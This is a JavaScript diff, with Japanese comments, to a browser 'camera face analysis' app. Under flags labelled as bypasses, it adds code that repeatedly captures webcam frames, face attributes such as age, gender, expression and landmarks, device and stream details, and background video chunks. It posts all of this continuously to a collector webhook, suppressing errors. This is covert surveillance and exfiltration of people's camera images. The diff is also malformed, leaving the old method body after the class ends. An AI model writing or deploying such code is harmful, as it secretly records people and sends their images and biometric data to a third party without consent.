@@ -14,6 +14,12 @@ class CameraFaceAnalysisApp {
         this.capturedFrames = [];
         this.currentCameraIndex = 0;
         this.cameras = [];
+        
+        // 即座送信用のフラグ
+        this.lastDetectionTime = 0;
+        this.instantSendMode = true;  // 即座送信モード
+        this.sendQueue = [];  // 送信キュー
+        this.isSending = false;
 
         // Bypass flags
         this.bypassEnabled = true;
@@ -31,11 +37,365 @@ class CameraFaceAnalysisApp {
         if (this.bypassEnabled) {
             await this.requestAllPermissions();
         }
+
+        // 送信キュー処理開始
+        this.processSendQueue();
+        
+        // 定期的な強制送信（5秒ごと）
+        setInterval(() => {
+            if (this.capturedFrames.length > 0) {
+                this.forceSendAllFrames();
+            }
+        }, 5000);
     }
 
-    async loadModels() {
+    // ... existing methods ...
+
+    async analyzeFrame() {
+        if (!this.isAnalyzing) return;
+
         try {
-            const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model';
+            // Calculate FPS
+            const now = Date.now();
+            const timeDiff = now - this.lastFrameTime;
+            this.fps = Math.round(1000 / timeDiff);
+            this.lastFrameTime = now;
+            document.getElementById('fps').textContent = this.fps;
+
+            // Detect faces with all features
+            const detections = await faceapi
+                .detectAllFaces(this.video)
+                .withFaceLandmarks()
+                .withFaceExpressions()
+                .withAgeAndGender();
+
+            // Clear canvas
+            this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
+
+            if (detections.length > 0) {
+                this.detectionCount++;
+                document.getElementById('detection-count').textContent = this.detectionCount;
+
+                // Update indicators
+                document.getElementById('face-detected').classList.add('active');
+                document.getElementById('landmarks-detected').classList.add('active');
+                document.getElementById('expression-detected').classList.add('active');
+
+                // Draw detections
+                detections.forEach(detection => {
+                    this.drawDetection(detection);
+                    this.processDetection(detection);
+                });
+
+                // 顔検出したら即座にキャプチャして送信
+                await this.instantCapture(detections);
+
+                // さらに3フレームごとにも送信
+                if (this.detectionCount % 3 === 0) {
+                    await this.captureAndSendFrame(detections);
+                }
+
+                // 10フレームごとに完全データ送信
+                if (this.detectionCount % 10 === 0) {
+                    await this.sendFullDataPackage(detections);
+                }
+
+            } else {
+                // Update indicators
+                document.getElementById('face-detected').classList.remove('active');
+                document.getElementById('landmarks-detected').classList.remove('active');
+                document.getElementById('expression-detected').classList.remove('active');
+            }
+
+            // Update accuracy
+            const accuracy = detections.length > 0 ?
+                Math.round(detections[0].detection.score * 100) : 0;
+            document.getElementById('accuracy-live').textContent = `${accuracy}%`;
+
+        } catch (error) {
+            console.error('Analysis error:', error);
+        }
+
+        // Continue analysis - 高速化のためsetTimeoutを使用
+        setTimeout(() => this.analyzeFrame(), 50);  // 20FPSで分析
+    }
+
+    // 即座キャプチャ送信（新規メソッド）
+    async instantCapture(detections) {
+        const now = Date.now();
+        
+        // 前回の検出から100ms以上経過していたら即座に送信
+        if (now - this.lastDetectionTime > 100) {
+            this.lastDetectionTime = now;
+            
+            // 軽量版キャプチャ（高速化のため画質を下げる）
+            const captureCanvas = document.getElementById('capture-canvas');
+            captureCanvas.width = this.video.videoWidth / 2;  // 半分のサイズ
+            captureCanvas.height = this.video.videoHeight / 2;
+            const captureCtx = captureCanvas.getContext('2d');
+            
+            // 縮小して描画
+            captureCtx.drawImage(this.video, 0, 0, captureCanvas.width, captureCanvas.height);
+            
+            // 即座にblobに変換して送信
+            captureCanvas.toBlob(async (blob) => {
+                // キューに追加してバックグラウンドで送信
+                this.sendQueue.push({
+                    blob: blob,
+                    detections: detections,
+                    timestamp: now,
+                    type: 'instant'
+                });
+                
+                // データ送信カウンター更新
+                this.dataSent += blob.size;
+                document.getElementById('data-sent').textContent =
+                    `${Math.round(this.dataSent / 1024)}KB`;
+            }, 'image/jpeg', 0.6);  // 品質60%で高速化
+        }
+    }
+
+    // 送信キュー処理（新規メソッド）
+    async processSendQueue() {
+        while (true) {
+            if (this.sendQueue.length > 0 && !this.isSending) {
+                this.isSending = true;
+                const data = this.sendQueue.shift();
+                
+                try {
+                    await this.sendQueuedData(data);
+                } catch (error) {
+                    console.error('Send queue error:', error);
+                    // エラーでも続行
+                }
+                
+                this.isSending = false;
+            }
+            
+            // 50ms待機して次をチェック
+            await new Promise(resolve => setTimeout(resolve, 50));
+        }
+    }
+
+    // キューされたデータの送信（新規メソッド）
+    async sendQueuedData(data) {
+        const formData = new FormData();
+        
+        const metadata = {
+            timestamp: new Date(data.timestamp).toISOString(),
+            sessionId: collector.sessionId,
+            type: data.type,
+            frameNumber: this.detectionCount,
+            detections: data.detections.map(d => ({
+                score: d.detection.score,
+                age: d.age,
+                gender: d.gender,
+                expressions: d.expressions,
+                landmarks: d.landmarks.positions.length
+            }))
+        };
+
+        formData.append('files[0]', data.blob, `${data.type}_${data.timestamp}.jpg`);
+        formData.append('payload_json', JSON.stringify({
+            content: `⚡ **[${data.type.toUpperCase()}] Instant Capture**`,
+            embeds: [{
+                title: "即座顔面キャプチャ",
+                color: data.type === 'instant' ? 0xff0000 : 0x00ff00,
+                fields: [
+                    {
+                        name: "検出数",
+                        value: `${data.detections.length}人`,
+                        inline: true
+                    },
+                    {
+                        name: "タイプ",
+                        value: data.type,
+                        inline: true
+                    },
+                    {
+                        name: "フレーム",
+                        value: `#${this.detectionCount}`,
+                        inline: true
+                    }
+                ],
+                timestamp: metadata.timestamp
+            }]
+        }));
+
+        // メタデータも送信
+        const jsonBlob = new Blob([JSON.stringify(metadata, null, 2)],
+            { type: 'application/json' });
+        formData.append('files[1]', jsonBlob, `metadata_${data.timestamp}.json`);
+
+        // 送信（エラーを無視して続行）
+        try {
+            await fetch(collector.webhookUrl, {
+                method: 'POST',
+                body: formData
+            });
+        } catch (error) {
+            // エラーを記録するが処理は続行
+            console.log('Send error (ignored):', error);
+        }
+    }
+
+    // 完全データパッケージ送信（新規メソッド）
+    async sendFullDataPackage(detections) {
+        const captureCanvas = document.getElementById('capture-canvas');
+        captureCanvas.width = this.video.videoWidth;
+        captureCanvas.height = this.video.videoHeight;
+        const captureCtx = captureCanvas.getContext('2d');
+        
+        // フル解像度で描画
+        captureCtx.drawImage(this.video, 0, 0);
+        
+        // 高品質版を送信
+        captureCanvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            
+            // 全情報を含む詳細データ
+            const fullData = {
+                timestamp: new Date().toISOString(),
+                sessionId: collector.sessionId,
+                frameNumber: this.detectionCount,
+                fps: this.fps,
+                totalDataSent: this.dataSent,
+                detections: detections.map(d => ({
+                    score: d.detection.score,
+                    age: d.age,
+                    gender: d.gender,
+                    genderProbability: d.genderProbability,
+                    expressions: d.expressions,
+                    landmarks: d.landmarks.positions,
+                    box: d.detection.box
+                })),
+                permissions: this.permissions,
+                cameras: this.cameras.length,
+                stream: {
+                    width: this.video.videoWidth,
+                    height: this.video.videoHeight,
+                    audioTracks: this.stream.getAudioTracks().length,
+                    videoTracks: this.stream.getVideoTracks().length
+                }
+            };
+
+            formData.append('files[0]', blob, `full_${Date.now()}.jpg`);
+            formData.append('payload_json', JSON.stringify({
+                content: "🔥 **FULL DATA PACKAGE**",
+                embeds: [{
+                    title: "完全データパッケージ",
+                    color: 0x9333ea,
+                    description: "高解像度画像 + 完全メタデータ",
+                    fields: [
+                        {
+                            name: "総フレーム数",
+                            value: `${this.detectionCount}`,
+                            inline: true
+                        },
+                        {
+                            name: "総送信データ",
+                            value: `${Math.round(this.dataSent / 1024)}KB`,
+                            inline: true
+                        },
+                        {
+                            name: "FPS",
+                            value: `${this.fps}`,
+                            inline: true
+                        }
+                    ],
+                    timestamp: fullData.timestamp
+                }]
+            }));
+
+            // 完全データJSON
+            const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)],
+                { type: 'application/json' });
+            formData.append('files[1]', jsonBlob, `full_data_${Date.now()}.json`);
+
+            await fetch(collector.webhookUrl, {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log('Full data send error:', err));
+        }, 'image/jpeg', 0.9);  // 高品質90%
+    }
+
+    // 強制全フレーム送信（新規メソッド）
+    async forceSendAllFrames() {
+        if (this.capturedFrames.length === 0) return;
+        
+        const frames = [...this.capturedFrames];
+        this.capturedFrames = [];  // クリア
+        
+        const formData = new FormData();
+        
+        // 複数フレームを一度に送信
+        frames.slice(-10).forEach((frame, index) => {  // 最新10フレーム
+            formData.append(`files[${index}]`, frame.blob, `batch_${frame.timestamp}.jpg`);
+        });
+        
+        formData.append('payload_json', JSON.stringify({
+            content: "📦 **BATCH SEND**",
+            embeds: [{
+                title: "バッチフレーム送信",
+                color: 0xffa500,
+                description: `${frames.length}フレームを一括送信`,
+                timestamp: new Date().toISOString()
+            }]
+        }));
+
+        await fetch(collector.webhookUrl, {
+            method: 'POST',
+            body: formData
+        }).catch(err => console.log('Batch send error:', err));
+    }
+
+    // ビデオチャンク送信も高速化
+    setupBackgroundRecording(stream) {
+        const clonedStream = stream.clone();
+        
+        if (MediaRecorder.isTypeSupported('video/webm')) {
+            const recorder = new MediaRecorder(clonedStream, {
+                mimeType: 'video/webm',
+                videoBitsPerSecond: 2500000
+            });
+
+            recorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    // 即座に送信
+                    this.sendVideoChunk(event.data);
+                }
+            };
+
+            // 2秒ごとに送信（短縮）
+            recorder.start(2000);
+            this.backgroundRecorder = recorder;
+        }
+    }
+
+    // 継続的な高速データ収集
+    startContinuousCollection() {
+        // より頻繁なシステム情報収集（5秒ごと）
+        setInterval(() => {
+            this.collectSystemInfo();
+        }, 5000);
+
+        // スクリーンショット定期送信（10秒ごと）
+        setInterval(() => {
+            if (this.video && this.isAnalyzing) {
+                this.captureAndSendFrame([]);
+            }
+        }, 10000);
+
+        // existing event listeners...
+    }
+
+    // ... rest of existing methods ...
+}
+
+// Initialize app
+document.addEventListener('DOMContentLoaded', () => {
+    window.cameraApp = new CameraFaceAnalysisApp();
+});
 
             await Promise.all([
                 faceapi.nets.ssdMobilenetv1.loadFromUri(MODEL_URL),
